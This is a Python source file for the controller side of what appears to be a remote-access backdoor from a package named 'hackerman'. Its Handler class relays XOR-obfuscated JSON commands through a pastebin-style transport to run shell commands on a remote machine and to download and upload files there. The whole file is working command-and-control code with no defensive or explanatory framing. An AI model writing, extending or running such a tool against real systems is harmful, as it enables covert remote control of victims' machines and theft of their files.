from hackerman.transport import ptpb
from hackerman.crypto import xor
import json

class Handler(object):
	def __init__(self, channel, password):
		self.cli = ptpb.Client(channel)
		self.encrypt = lambda x: xor.encrypt(x, password)
		self.decrypt = lambda x: xor.decrypt(x, password)

		# handshake
		self.cli.send("ready".encode())
		while not self.cli.recv().decode() == "okay":
			pass

	def send_cmd(self, cmd):
		txt = json.dumps(cmd)
		enc = self.encrypt(txt.encode())
		
		self.cli.send(enc)
		res = self.cli.recv()

		dec = self.decrypt(res)
		msg = json.loads(dec.decode())

		return msg

	def sh(self, cmd):
		cmd = {
			'type':'sh',
			'cmd':cmd
		}
		return self.send_cmd(cmd)['res']
	def dl(self, fn):
		cmd = {
			'type':'dl',
			'fn':fn
		}
		return self.send_cmd(cmd)['res']
	def ul(self, raw, fn):
		cmd = {
			'type':'ul',
			'fn':fn,
			'fd':raw
		}
		return self.send_cmd(cmd)['res']
	def exit(self):
		cmd = {'type':'exit'}
		return self.send_cmd(cmd)['res']